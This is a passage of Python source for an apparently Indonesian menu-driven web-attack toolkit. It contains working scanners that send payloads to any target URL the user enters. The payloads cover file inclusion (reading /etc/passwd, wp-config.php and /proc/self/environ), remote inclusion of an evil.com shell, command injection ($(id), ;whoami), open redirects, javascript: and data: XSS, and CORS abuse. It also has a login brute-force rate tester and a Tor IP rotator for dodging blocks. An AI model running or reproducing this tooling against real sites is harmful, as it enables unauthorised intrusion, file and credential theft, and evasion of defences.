{CYAN}├─ ENGINES TESTED     : {len(ssti_payloads)}{RESET}
{CYAN}└─ SSTI VULNERABLE    : {len(vulns)}{RESET}
        """)
        
        if vulns:
            print(f"{RED}{BOLD}[!] RCE POSSIBLE VIA SSTI!{RESET}")
        
        self.scan_results.append({
            'module': 'SSTI SCANNER',
            'target': base_url,
            'vulnerable': len(vulns),
            'timestamp': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })
        
        input(f"\n{CYAN}{BOLD}[?] TEKAN ENTER UNTUK LANJUT...{RESET}")
    # ================================================================
    # MENU 21: LFI/RFI VULNERABILITY SCANNER
    # ================================================================
    def menu_lfi_rfi_scanner(self):
        self.clear_screen()
        print(f"\n{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}")
        print(f"{CYAN}{BOLD}📁 MENU 21: LFI/RFI SCANNER - LOCAL/REMOTE FILE INCLUSION{RESET}")
        print(f"{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}\n")
        
        url = input(f"{YELLOW}{BOLD}[?] MASUKKAN URL DENGAN PARAMETER (https://target.com/page?file=): {RESET}")
        loading2(f"TESTING LFI/RFI ON {url}", 2)
        
        if '?' in url:
            base_url = url.split('?')[0]
            param = url.split('?')[1].split('=')[0] if '=' in url.split('?')[1] else 'file'
        else:
            base_url = url
            param = input(f"{CYAN}{BOLD}[?] NAMA PARAMETER (file, page, load, dll): {RESET}")
        
        lfi_payloads = [
            "../../../etc/passwd", "../../../../etc/passwd", "../../../../../etc/passwd",
            "../../../../../../etc/passwd", "../../../../../../../etc/passwd",
            "/etc/passwd", "etc/passwd", "../etc/passwd", "....//....//....//etc/passwd",
            "../../../etc/passwd%00", "../../../etc/passwd%00.jpg", "../../../etc/passwd.jpg",
            "..\\..\\..\\windows\\win.ini", "..\\..\\..\\..\\windows\\win.ini",
            "C:\\windows\\win.ini", "C:\\boot.ini", "../../../proc/self/environ",
            "../../../proc/self/cmdline", "../../../proc/version", "../../../proc/cpuinfo",
            "../../../var/log/apache2/access.log", "../../../var/log/nginx/access.log",
            "../../../var/log/httpd/access_log", "php://filter/convert.base64-encode/resource=index.php",
            "php://filter/convert.base64-encode/resource=config.php",
            "php://filter/convert.base64-encode/resource=wp-config.php"
        ]
        
        rfi_payloads = [
            "http://evil.com/shell.txt", "https://evil.com/shell.txt", "http://127.0.0.1/shell.txt",
            "http://localhost/shell.txt", "http://169.254.169.254/shell.txt",
            "https://raw.githubusercontent.com/evil/shell.txt", "http://evil.com/shell.php?cmd=id"
        ]
        
        vulns = []
        
        print(f"\n{CYAN}{BOLD}[*] TESTING LFI PAYLOADS...{RESET}\n")
        
        for payload in lfi_payloads:
            test_url = f"{base_url}?{param}={payload}"
            try:
                r = requests.get(test_url, timeout=5)
                if 'root:' in r.text or 'bin/bash' in r.text or 'daemon:' in r.text:
                    print(f"{RED}[!] LFI DETECTED! {payload[:50]}{RESET}")
                    print(f"{RED}    └─ RESPONSE PREVIEW: {r.text[:200]}{RESET}")
                    vulns.append({'type': 'LFI', 'payload': payload})
                elif '[extensions]' in r.text or 'win.ini' in r.text:
                    print(f"{RED}[!] LFI DETECTED (WINDOWS)! {payload[:50]}{RESET}")
                    vulns.append({'type': 'LFI', 'payload': payload})
                elif '<?php' in r.text or 'PDO' in r.text or 'DB_PASSWORD' in r.text:
                    print(f"{RED}[!] LFI DETECTED - PHP SOURCE CODE!{RESET}")
                    vulns.append({'type': 'LFI', 'payload': payload})
            except:
                pass
            time.sleep(0.02)
        
        print(f"\n{CYAN}{BOLD}[*] TESTING RFI PAYLOADS...{RESET}\n")
        
        for payload in rfi_payloads:
            test_url = f"{base_url}?{param}={payload}"
            try:
                r = requests.get(test_url, timeout=5)
                if r.status_code == 200 and len(r.text) > 100:
                    print(f"{RED}[!] RFI POSSIBLE! {payload[:50]}{RESET}")
                    vulns.append({'type': 'RFI', 'payload': payload})
            except:
                pass
            time.sleep(0.02)
        
        self.lfi_vulns = vulns
        
        print(f"""
{GREEN}{BOLD}[✓] LFI/RFI SCAN COMPLETED!{RESET}
{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}
{CYAN}{BOLD}[!] SUMMARY:{RESET}
{CYAN}├─ TARGET URL         : {base_url}{RESET}
{CYAN}├─ LFI PAYLOADS       : {len(lfi_payloads)}{RESET}
{CYAN}├─ RFI PAYLOADS       : {len(rfi_payloads)}{RESET}
{CYAN}└─ VULNERABLE FOUND   : {len(vulns)}{RESET}
        """)
        
        if vulns:
            print(f"{RED}{BOLD}[!] BISA BACA FILE SENSITIF ATAU REMOTE CODE EXECUTION!{RESET}")
        
        self.scan_results.append({
            'module': 'LFI/RFI SCANNER',
            'target': base_url,
            'vulnerable': len(vulns),
            'timestamp': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })
        
        input(f"\n{CYAN}{BOLD}[?] TEKAN ENTER UNTUK LANJUT...{RESET}")

    # ================================================================
    # MENU 22: RCE VULNERABILITY SCANNER
    # ================================================================
    def menu_rce_scanner(self):
        self.clear_screen()
        print(f"\n{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}")
        print(f"{CYAN}{BOLD}💀 MENU 22: RCE SCANNER - REMOTE CODE EXECUTION{RESET}")
        print(f"{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}\n")
        
        url = input(f"{YELLOW}{BOLD}[?] MASUKKAN URL TARGET (https://target.com/page?cmd=): {RESET}")
        loading3(f"TESTING RCE ON {url}", 2)
        
        if '?' in url:
            base_url = url.split('?')[0]
            param = url.split('?')[1].split('=')[0] if '=' in url.split('?')[1] else 'cmd'
        else:
            base_url = url
            param = input(f"{CYAN}{BOLD}[?] NAMA PARAMETER (cmd, exec, command, dll): {RESET}")
        
        rce_payloads = [
            "id", "whoami", "pwd", "ls", "dir", "echo test123", "echo test123 && echo test456",
            "ping -c 1 127.0.0.1", "cat /etc/passwd", "type C:\\windows\\win.ini",
            "|id", "||id", "&id", "&&id", ";id", "`id`", "$(id)", "%0aid", "%0a%0aid",
            "test;id", "test|id", "test||id", "test&id", "test&&id", "test`id`",
            "test$(id)", "test%0aid", "test%0a%0aid", "|whoami", "||whoami", "&whoami",
            "&&whoami", ";whoami", "`whoami`", "$(whoami)", "|ls", "||ls", "&ls", "&&ls",
            ";ls", "`ls`", "$(ls)", "|dir", "||dir", "&dir", "&&dir", ";dir", "`dir`", "$(dir)"
        ]
        
        vulns = []
        
        print(f"\n{CYAN}{BOLD}[*] TESTING RCE PAYLOADS...{RESET}\n")
        
        for payload in rce_payloads:
            test_url = f"{base_url}?{param}={payload}"
            try:
                r = requests.get(test_url, timeout=5)
                if 'uid=' in r.text or 'gid=' in r.text or 'root' in r.text:
                    print(f"{RED}[!] RCE DETECTED! COMMAND: {payload}{RESET}")
                    print(f"{RED}    └─ OUTPUT: {r.text[:200]}{RESET}")
                    vulns.append(payload)
                elif 'test123' in r.text and payload not in r.text:
                    print(f"{RED}[!] RCE DETECTED! ECHO COMMAND WORKING{RESET}")
                    vulns.append(payload)
                elif 'Users' in r.text or 'Program Files' in r.text:
                    print(f"{RED}[!] RCE DETECTED (WINDOWS)!{RESET}")
                    vulns.append(payload)
            except:
                pass
            time.sleep(0.02)
        
        self.rce_vulns = vulns
        
        print(f"""
{GREEN}{BOLD}[✓] RCE SCAN COMPLETED!{RESET}
{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}
{CYAN}{BOLD}[!] SUMMARY:{RESET}
{CYAN}├─ TARGET URL         : {base_url}{RESET}
{CYAN}├─ TOTAL PAYLOADS     : {len(rce_payloads)}{RESET}
{CYAN}└─ RCE VULNERABLE     : {len(vulns)}{RESET}
        """)
        
        if vulns:
            print(f"{RED}{BOLD}[!] SERVER BISA DIHACK TOTAL! LANGSUNG DAPAT SHELL!{RESET}")
        
        self.scan_results.append({
            'module': 'RCE SCANNER',
            'target': base_url,
            'vulnerable': len(vulns),
            'timestamp': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })
        
        input(f"\n{CYAN}{BOLD}[?] TEKAN ENTER UNTUK LANJUT...{RESET}")

    # ================================================================
    # MENU 23: OPEN REDIRECT SCANNER
    # ================================================================
    def menu_open_redirect_scanner(self):
        self.clear_screen()
        print(f"\n{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}")
        print(f"{CYAN}{BOLD}🔄 MENU 23: OPEN REDIRECT SCANNER - URL REDIRECTION VULN{RESET}")
        print(f"{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}\n")
        
        url = input(f"{YELLOW}{BOLD}[?] MASUKKAN URL DENGAN PARAMETER REDIRECT (https://target.com/redirect?url=): {RESET}")
        loading1(f"TESTING OPEN REDIRECT ON {url}", 2)
        
        if '?' in url:
            base_url = url.split('?')[0]
            param = url.split('?')[1].split('=')[0] if '=' in url.split('?')[1] else 'url'
        else:
            base_url = url
            param = input(f"{CYAN}{BOLD}[?] NAMA PARAMETER (url, redirect, next, dll): {RESET}")
        
        redirect_payloads = [
            "https://evil.com", "http://evil.com", "//evil.com", "///evil.com", "evil.com",
            "https://evil.com@target.com", "https://evil.com/target.com", "https://evil.com?target.com",
            "//evil.com/@target.com", "https://evil.com#target.com", "/\\evil.com",
            "https://evil.com\\@target.com", "https://target.com@evil.com", "//target.com@evil.com",
            "https://evil.com.phishing.com", "https://evil%2Ecom", "javascript:alert('XSS')",
            "data:text/html,<script>alert(1)</script>", "https://google.com@evil.com",
            "//google.com%252F@evil.com", "https://evil.com/.google.com", "https://evil.com%252Fgoogle.com"
        ]
        
        vulns = []
        
        print(f"\n{CYAN}{BOLD}[*] TESTING OPEN REDIRECT PAYLOADS...{RESET}\n")
        
        for payload in redirect_payloads:
            test_url = f"{base_url}?{param}={payload}"
            try:
                r = requests.get(test_url, timeout=5, allow_redirects=False)
                location = r.headers.get('Location', '')
                if location and ('evil.com' in location or 'javascript:' in location or 'data:' in location):
                    print(f"{RED}[!] OPEN REDIRECT DETECTED! PAYLOAD: {payload}{RESET}")
                    print(f"{RED}    └─ REDIRECT TO: {location[:80]}{RESET}")
                    vulns.append(payload)
                elif r.status_code in [301, 302, 303, 307, 308]:
                    location = r.headers.get('Location', '')
                    if payload in location or location.startswith('http://evil'):
                        print(f"{RED}[!] OPEN REDIRECT DETECTED!{RESET}")
                        vulns.append(payload)
            except:
                pass
            time.sleep(0.02)
        
        self.open_redirects = vulns
        
        print(f"""
{GREEN}{BOLD}[✓] OPEN REDIRECT SCAN COMPLETED!{RESET}
{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}
{CYAN}{BOLD}[!] SUMMARY:{RESET}
{CYAN}├─ TARGET URL         : {base_url}{RESET}
{CYAN}├─ TOTAL PAYLOADS     : {len(redirect_payloads)}{RESET}
{CYAN}└─ VULNERABLE         : {len(vulns)}{RESET}
        """)
        
        if vulns:
            print(f"{YELLOW}{BOLD}[!] BISA DIGUNAKAN UNTUK PHISHING ATAU SSRF{RESET}")
        
        self.scan_results.append({
            'module': 'OPEN REDIRECT SCANNER',
            'target': base_url,
            'vulnerable': len(vulns),
            'timestamp': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })
        
        input(f"\n{CYAN}{BOLD}[?] TEKAN ENTER UNTUK LANJUT...{RESET}")

    # ================================================================
    # MENU 24: CORS VULNERABILITY SCANNER
    # ================================================================
    def menu_cors_scanner(self):
        self.clear_screen()
        print(f"\n{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}")
        print(f"{CYAN}{BOLD}🌐 MENU 24: CORS SCANNER - CROSS ORIGIN RESOURCE SHARING{RESET}")
        print(f"{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}\n")
        
        target = input(f"{YELLOW}{BOLD}[?] MASUKKAN TARGET URL (https://target.com/api/data): {RESET}")
        loading2(f"TESTING CORS CONFIGURATION ON {target}", 2)
        
        origins = [
            "https://evil.com", "https://attacker.com", "https://hacker.com",
            "null", "https://target.com.evil.com", "https://evil.target.com",
            "https://target.com@evil.com", "https://target.com%252Fevil.com",
            "https://target.com.evil.com", "http://evil.com", "http://attacker.com"
        ]
        
        vulns = []
        
        print(f"\n{CYAN}{BOLD}[*] TESTING CORS MISCONFIGURATIONS...{RESET}\n")
        
        for origin in origins:
            try:
                headers = {'Origin': origin}
                r = requests.get(target, headers=headers, timeout=5)
                
                acao = r.headers.get('Access-Control-Allow-Origin', '')
                acac = r.headers.get('Access-Control-Allow-Credentials', '')
                
                if acao == origin:
                    print(f"{RED}[!] CORS MISCONFIGURED! ACAO: {acao}{RESET}")
                    if acac == 'true':
                        print(f"{RED}    └─ CREDENTIALS ALLOWED! BISA CURHAT SESSION!{RESET}")
                    vulns.append({'origin': origin, 'acao': acao, 'acac': acac})
                elif acao == '*':
                    print(f"{YELLOW}[!] CORS WILDCARD DETECTED! ACAO: *{RESET}")
                    vulns.append({'origin': origin, 'acao': '*', 'acac': acac})
                else:
                    print(f"{GREEN}[-] CORS SAFE: ACAO={acao}{RESET}")
            except:
                pass
            time.sleep(0.03)
        
        self.cors_vulns = vulns
        
        print(f"""
{GREEN}{BOLD}[✓] CORS SCAN COMPLETED!{RESET}
{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}
{CYAN}{BOLD}[!] SUMMARY:{RESET}
{CYAN}├─ TARGET URL         : {target}{RESET}
{CYAN}├─ ORIGINS TESTED     : {len(origins)}{RESET}
{CYAN}└─ CORS VULNERABLE    : {len(vulns)}{RESET}
        """)
        
        self.scan_results.append({
            'module': 'CORS SCANNER',
            'target': target,
            'vulnerable': len(vulns),
            'timestamp': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })
        
        input(f"\n{CYAN}{BOLD}[?] TEKAN ENTER UNTUK LANJUT...{RESET}")

    # ================================================================
    # MENU 25: CSRF TOKEN DETECTION
    # ================================================================
    def menu_csrf_detector(self):
        self.clear_screen()
        print(f"\n{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}")
        print(f"{CYAN}{BOLD}🔐 MENU 25: CSRF TOKEN DETECTOR - ANTI-CSRF ANALYSIS{RESET}")
        print(f"{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}\n")
        
        url = input(f"{YELLOW}{BOLD}[?] MASUKKAN URL LOGIN/FORM (https://target.com/login): {RESET}")
        loading3(f"ANALYZING CSRF PROTECTION ON {url}", 2)
        
        try:
            r = requests.get(url, timeout=5)
            content = r.text.lower()
            
            csrf_patterns = {
                'csrf_token': r'csrf_token',
                'csrfmiddlewaretoken': r'csrfmiddlewaretoken',
                'authenticity_token': r'authenticity_token',
                '_token': r'_token',
                '__RequestVerificationToken': r'__requestverificationtoken',
                'csrf': r'csrf',
                'xsrf': r'xsrf',
                'x-csrf': r'x-csrf',
                'anti-csrf': r'anti-csrf',
                'anticsrf': r'anticsrf'
            }
            
            found_tokens = []
            for name, pattern in csrf_patterns.items():
                if re.search(pattern, content):
                    print(f"{GREEN}[+] CSRF TOKEN DETECTED: {name}{RESET}")
                    found_tokens.append(name)
            
            if not found_tokens:
                print(f"{RED}[!] TIDAK ADA CSRF TOKEN DETECTED! RENTAN CSRF!{RESET}")
            else:
                print(f"{GREEN}[✓] CSRF PROTECTION ACTIVE!{RESET}")
            
            self.csrf_tokens = found_tokens
            
        except Exception as e:
            print(f"{RED}[!] ERROR: {e}{RESET}")
        
        print(f"""
{GREEN}{BOLD}[✓] CSRF DETECTION COMPLETED!{RESET}
{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}
{CYAN}{BOLD}[!] SUMMARY:{RESET}
{CYAN}├─ TARGET URL         : {url}{RESET}
{CYAN}└─ CSRF TOKEN FOUND   : {len(self.csrf_tokens)}{RESET}
        """)
        
        self.scan_results.append({
            'module': 'CSRF DETECTOR',
            'target': url,
            'csrf_tokens': len(self.csrf_tokens),
            'timestamp': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })
        
        input(f"\n{CYAN}{BOLD}[?] TEKAN ENTER UNTUK LANJUT...{RESET}")

    # ================================================================
    # MENU 26: RATE LIMIT TESTER
    # ================================================================
     # ================================================================
# MENU 26: RATE LIMIT TESTER (PERBAIKAN INDENTASI)
# ================================================================
    def menu_rate_limit_tester(self):
        self.clear_screen()
        print(f"\n{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}")
        print(f"{CYAN}{BOLD}⏱️ MENU 26: RATE LIMIT TESTER - BRUTE FORCE READINESS{RESET}")
        print(f"{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}\n")
        
        url = input(f"{YELLOW}{BOLD}[?] MASUKKAN URL LOGIN/API (https://target.com/login): {RESET}")
        loading1(f"TESTING RATE LIMIT ON {url}", 2)
        
        results = []
        response_times = []
        
        print(f"\n{CYAN}{BOLD}[*] MENGIRIM 50 REQUEST CEPAT...{RESET}\n")
        
        for i in range(50):
            try:
                start = time.time()
                r = requests.post(url, data={'user': 'test', 'pass': 'wrong'}, timeout=3)
                end = time.time()
                response_times.append(end - start)
                
                if r.status_code == 429:
                    print(f"{RED}[!] RATE LIMIT TRIGGERED PADA REQUEST KE-{i+1}{RESET}")
                    results.append(f"RATE_LIMIT_ACTIVE_AT_{i+1}")
                    break
                elif r.status_code == 403 or r.status_code == 401:
                    print(f"{YELLOW}[!] STATUS {r.status_code} - MUNGKIN BLOKIR IP{RESET}")
                    results.append(f"BLOCKED_AT_{i+1}")
                    break
                elif i % 10 == 0:
                    print(f"{GREEN}[+] REQUEST {i+1}/50 SUCCESS{RESET}")
                    
            except Exception as e:
                print(f"{RED}[!] ERROR PADA REQUEST {i+1}: {e}{RESET}")
                results.append(f"ERROR_AT_{i+1}")
                break
            time.sleep(0.05)
        
        avg_time = sum(response_times) / len(response_times) if response_times else 0
        
        self.rate_limit_results = results
        
        print(f"""
{GREEN}{BOLD}[✓] RATE LIMIT TEST COMPLETED!{RESET}
{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}
{CYAN}{BOLD}[!] SUMMARY:{RESET}
{CYAN}├─ TARGET URL         : {url}{RESET}
{CYAN}├─ REQUEST SENT       : {len(response_times)}{RESET}
{CYAN}├─ AVG RESPONSE TIME  : {avg_time:.2f}s{RESET}
{CYAN}└─ RATE LIMIT STATUS  : {'🔴 TIDAK ADA RATE LIMIT! RENTAN BRUTE FORCE!' if not results else '🟢 ADA RATE LIMIT'}{RESET}
        """)
        
        self.scan_results.append({
            'module': 'RATE LIMIT TESTER',
            'target': url,
            'requests_sent': len(response_times),
            'timestamp': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })
        
        input(f"\n{CYAN}{BOLD}[?] TEKAN ENTER UNTUK LANJUT...{RESET}")

    # ================================================================
    # MENU 27: TELEGRAM ACCOUNT REPORT (SCAM REPORT)
    # ================================================================
    def menu_telegram_report(self):
        self.clear_screen()
        print(f"\n{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}")
        print(f"{CYAN}{BOLD}📢 MENU 27: TELEGRAM REPORT - BAN AKUN/CHANNEL VIA EMAIL{RESET}")
        print(f"{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}\n")
        
        print(f"""
{CYAN}{BOLD}PILIH JENIS REPORT:{RESET}
{GREEN}[1]{RESET} REPORT AKUN SCAM/FAKE INVESTASI
{GREEN}[2]{RESET} REPORT CHANNEL PALSU/MENYESATKAN
        """)
        
        choice = input(f"{YELLOW}{BOLD}[?] PILIH (1-2): {RESET}")
        
        if choice == '1':
            username = input(f"{CYAN}{BOLD}[?] USERNAME (tanpa @): {RESET}")
            report_text = f"""Hello Telegram Team,

I would like to report a crypto scam/fake investment account.

Account:
@{username}
https://t.me/{username}

This user is suspected of misleading people through fake crypto schemes, impersonation, or fraudulent investment promises.

Please review and take strict action against this account.

Thank you."""
        else:
            channel = input(f"{CYAN}{BOLD}[?] CHANNEL URL/LINK: {RESET}")
            report_text = f"""Hello Telegram Support,

I am reporting a fake/misleading Telegram channel.

Channel:
{channel}

This channel impersonates another community/brand/person and spreads misleading information.

Please review the channel and take appropriate moderation action.

Thank you."""
        
        print(f"\n{YELLOW}{BOLD}[!] TEKS REPORT:{RESET}\n")
        print(f"{WHITE}{report_text}{RESET}\n")
        
        send_email = input(f"{YELLOW}{BOLD}[?] KIRIM VIA EMAIL? (y/n): {RESET}")
        
        if send_email.lower() == 'y':
            if not self.email_sender:
                self.email_sender = input(f"{CYAN}{BOLD}[?] EMAIL SENDER (Gmail): {RESET}")
                self.email_password = input(f"{CYAN}{BOLD}[?] APP PASSWORD: {RESET}")
            
            try:
                msg = MIMEMultipart()
                msg['From'] = self.email_sender
                msg['To'] = "abuse@telegram.org"
                msg['Subject'] = "Telegram Abuse Report - Scam Account"
                msg.attach(MIMEText(report_text, 'plain'))
                
                server = smtplib.SMTP('smtp.gmail.com', 587)
                server.starttls()
                server.login(self.email_sender, self.email_password)
                server.send_message(msg)
                server.quit()
                
                print(f"{GREEN}{BOLD}[✓] REPORT TERKIRIM VIA EMAIL!{RESET}")
                self.telegram_reports.append({'target': username if choice=='1' else channel, 'status': 'SENT'})
            except Exception as e:
                print(f"{RED}{BOLD}[!] GAGAL KIRIM EMAIL: {e}{RESET}")
        
        print(f"""
{GREEN}{BOLD}[✓] TELEGRAM REPORT COMPLETED!{RESET}
{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}
{CYAN}{BOLD}[!] REKOMENDASI:{RESET}
{CYAN}├─ LAPORKAN JUGA KE: stop-scam@telegram.org{RESET}
{CYAN}├─ LAPORKAN JUGA KE: dmca@telegram.org{RESET}
{CYAN}└─ SHARE BUkti KE FRAUD REPORT PLATFORM{RESET}
        """)
        
        self.scan_results.append({
            'module': 'TELEGRAM REPORT',
            'target': username if choice=='1' else channel,
            'timestamp': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })
        
        input(f"\n{CYAN}{BOLD}[?] TEKAN ENTER UNTUK LANJUT...{RESET}")

    # ================================================================
    # MENU 28: SAVE REPORT - SIMPAN SEMUA HASIL SCAN
    # ================================================================
    # ================================================================
# MENU 28: AUTO IP CHANGER - TOR MULTI-THREAD IP ROTATOR
# ================================================================
    def menu_auto_ip_changer(self):
        self.clear_screen()
        print(f"\n{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}")
        print(f"{CYAN}{BOLD}🌐 MENU 28: AUTO IP CHANGER - TOR MULTI-THREAD IP ROTATOR 🌐{RESET}")
        print(f"{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}\n")
        
        print(f"""
{YELLOW}{BOLD}[!] FITUR IP CHANGER:{RESET}
{GREEN}[1]{RESET} START IP ROTATOR (MULTI-TOR)
{GREEN}[2]{RESET} STOP IP ROTATOR
{GREEN}[3]{RESET} CHECK CURRENT IP
{GREEN}[4]{RESET} TEST PROXY CONNECTION
        """)
        
        choice = input(f"{YELLOW}{BOLD}[?] PILIH (1-4): {RESET}")
        
        if choice == '1':
            rotation_time = input(f"{CYAN}{BOLD}[?] INTERVAL ROTASI (detik, min 5): {RESET}")
            try:
                rotation_time = int(rotation_time)
                if rotation_time < 5:
                    rotation_time = 5
            except:
                rotation_time = 10
            
            print(f"\n{CYAN}{BOLD}[*] MEMULAI IP ROTATOR DENGAN {rotation_time} DETIK INTERVAL{RESET}")
            print(f"{YELLOW}{BOLD}[!] TEKAN CTRL+C UNTUK BERHENTI{RESET}\n")
            
            try:
                import subprocess
                import threading
                import time
                import requests
                
                # TOR ports
                ports = [9050, 9060, 9070, 9080, 9090]
                control_ports = [9051, 9061, 9071, 9081, 9091]
                
                # Setup TOR instances
                for i in range(5):
                    tor_dir = os.path.expanduser(f"~/.tor_multi/tor{i}")
                    os.makedirs(tor_dir, exist_ok=True)
                    
                    torrc = f"""{tor_dir}/torrc"
SocksPort {ports[i]}
ControlPort {control_ports[i]}
DataDirectory {tor_dir}
CookieAuthentication 0
"""
                    with open(f"{tor_dir}/torrc", 'w') as f:
                        f.write(torrc)
                    
                    # Start TOR
                    subprocess.Popen(['tor', '-f', f"{tor_dir}/torrc"], 
                                   stdout=subprocess.DEVNULL, 
                                   stderr=subprocess.DEVNULL)
                
                time.sleep(3)
                
                # Setup Privoxy
                privoxy_config = os.path.expanduser("~/.privoxy/config")
                os.makedirs(os.path.dirname(privoxy_config), exist_ok=True)
                
                with open(privoxy_config, 'w') as f:
                    f.write("listen-address 127.0.0.1:8118\n")
                    for port in ports:
                        f.write(f"forward-socks5 / 127.0.0.1:{port} .\n")
                
                subprocess.Popen(['privoxy', privoxy_config], 
                               stdout=subprocess.DEVNULL, 
                               stderr=subprocess.DEVNULL)
                
                time.sleep(2)
                
                # IP rotator loop
                while True:
                    for ctrl_port in control_ports:
                        try:
                            import socket
                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            s.connect(('127.0.0.1', ctrl_port))
                            s.send(b'AUTHENTICATE ""\r\nSIGNAL NEWNYM\r\nQUIT\r\n')
                            s.close()
                        except:
                            pass
                    
                    try:
                        new_ip = requests.get('https://api64.ipify.org', 
                                            proxies={'http': 'http://127.0.0.1:8118'}, 
                                            timeout=10).text
                        print(f"{GREEN}[✓] IP BARU: {new_ip}{RESET}")
                        print(f"{BLUE}[*] PROXY: 127.0.0.1:8118{RESET}")
                    except Exception as e:
                        print(f"{RED}[!] GAGAL GET IP: {e}{RESET}")
                    
                    time.sleep(rotation_time)
                    
            except KeyboardInterrupt:
                print(f"\n{YELLOW}[!] IP ROTATOR DIHENTIKAN{RESET}")
            except Exception as e:
                print(f"{RED}[!] ERROR: {e}{RESET}")
                print(f"{YELLOW}[!] INSTALL: pkg install tor privoxy{RESET}")
        
        elif choice == '2':
            print(f"\n{CYAN}{BOLD}[*] MEMATIKAN IP ROTATOR...{RESET}")
            os.system('pkill tor 2>/dev/null')
            os.system('pkill privoxy 2>/dev/null')
            print(f"{GREEN}[✓] IP ROTATOR DIHENTIKAN{RESET}")
        
        elif choice == '3':
            print(f"\n{CYAN}{BOLD}[*] CHECK IP SAAT INI...{RESET}")
            try:
                real_ip = requests.get('https://api64.ipify.org', timeout=5).text
                print(f"{GREEN}[✓] IP ASLI: {real_ip}{RESET}")
                
                try:
                    tor_ip = requests.get('https://api64.ipify.org', 
                                        proxies={'http': 'http://127.0.0.1:8118'}, 
                                        timeout=5).text
                    print(f"{GREEN}[✓] IP VIA TOR: {tor_ip}{RESET}")
                except:
                    print(f"{RED}[!] TOR BELUM AKTIF!{RESET}")
            except Exception as e:
                print(f"{RED}[!] ERROR: {e}{RESET}")
        
        elif choice == '4':
            print(f"\n{CYAN}{BOLD}[*] TESTING PROXY CONNECTION...{RESET}")
            try:
                r = requests.get('https://httpbin.org/ip', 
                               proxies={'http': 'http://127.0.0.1:8118'}, 
                               timeout=10)
                print(f"{GREEN}[✓] PROXY WORKING!{RESET}")
                print(f"{GREEN}[✓] RESPONSE: {r.text}{RESET}")
            except Exception as e:
                print(f"{RED}[!] PROXY ERROR: {e}{RESET}")
        
        self.scan_results.append({
            'module': 'AUTO IP CHANGER',
            'target': 'TOR Multi-Thread',
            'timestamp': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })
        
        input(f"\n{CYAN}{BOLD}[?] TEKAN ENTER UNTUK LANJUT...{RESET}")
    # ================================================================
    # MENU 29: AUTOMATED RECONNAISSANCE - FULL OSINT AUTOPILOT
    # ================================================================
    def menu_autorecon(self):
        self.clear_screen()
        print(f"\n{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}")
        print(f"{CYAN}{BOLD}🤖 MENU 29: AUTOMATED RECONNAISSANCE - FULL OSINT AUTOPILOT{RESET}")
        print(f"{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}\n")
        
        target = input(f"{YELLOW}{BOLD}[?] MASUKKAN TARGET (DOMAIN/IP): {RESET}")
        print(f"\n{CYAN}{BOLD}[!] MEMULAI AUTOMATED RECON PADA {target}{RESET}")
        print(f"{CYAN}{BOLD}[!] INI AKAN MEMAKAN WAKTU 3-5 MENIT...{RESET}\n")
        
        results = {}
        
        # PHASE 1: DNS ENUMERATION
        loading1(f"[1/6] DNS ENUMERATION ON {target}", 2)
        dns_results = []
        for rt in ['A', 'AAAA', 'MX', 'NS', 'TXT', 'SOA']:
            try:
                answers = dns.resolver.resolve(target, rt)
                for ans in answers:
                    dns_results.append(f"{rt}: {ans}")
                    print(f"{GREEN}[DNS] {rt}: {ans}{RESET}")
            except:
                pass
        results['dns'] = dns_results
        
        # PHASE 2: SUBDOMAIN ENUMERATION
        loading2(f"[2/6] SUBDOMAIN ENUMERATION ON {target}", 2)
